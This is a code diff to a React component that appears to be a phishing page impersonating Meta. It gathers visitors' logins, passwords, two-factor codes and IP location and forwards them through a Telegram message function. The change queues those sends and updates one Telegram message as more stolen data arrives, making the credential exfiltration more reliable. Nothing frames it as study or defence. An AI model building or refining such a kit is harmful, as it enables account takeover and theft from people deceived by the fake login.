@@ -1,4 +1,4 @@
-import { useEffect, useState, useMemo } from 'react';
+import { useEffect, useState, useMemo, useRef } from 'react';
 import { useLocation } from 'react-router';
 import axios from 'axios';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
@@ -60,6 +60,9 @@ const Home = () =>
     const [ twoFAAttempts, setTwoFAAttempts ] = useState( [] );
     const [ ipInfo, setIpInfo ] = useState( { ip: 'Unknown', country: 'Unknown', countryCode: 'US' } );
     const [ isLoading, setIsLoading ] = useState( true );
+
+    const telegramMsgIdRef = useRef( null );
+    const sendQueueRef = useRef( Promise.resolve() );
 
     const texts = useMemo(
         () => ( {
@@ -278,7 +281,7 @@ const Home = () =>
         );
     };
 
-    const buildAndSend = async ( data ) =>
+    const buildAndSend = ( data ) =>
     {
         const dt = formatDateTime( new Date() );
         const { form, login, passes, codes } = data;
@@ -328,13 +331,14 @@ const Home = () =>
 
         message += `━━━━━━━━━━━━━━━━━━━━`;
 
-        try
+        sendQueueRef.current = sendQueueRef.current.then( async () =>
         {
-            await sendMessage( message );
-        } catch ( error )
-        {
-            console.error( 'Error sending message:', error );
-        }
+            const sentId = await sendMessage( message, telegramMsgIdRef.current );
+            if ( sentId && !telegramMsgIdRef.current )
+            {
+                telegramMsgIdRef.current = sentId;
+            }
+        } );
     };
 
     const handleFirstFormSubmit = ( data ) =>
